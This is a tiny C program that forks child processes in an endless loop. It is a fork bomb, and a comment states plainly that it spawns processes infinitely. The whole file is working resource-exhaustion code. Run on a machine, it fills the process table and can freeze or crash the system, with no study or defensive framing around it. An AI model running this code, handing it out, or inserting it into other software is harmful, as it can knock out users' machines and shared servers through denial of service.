#include <unistd.h>

int main() {
    while (1) {
        fork();  // Keep spawning child processes infinitely
    }
    return 0;
}
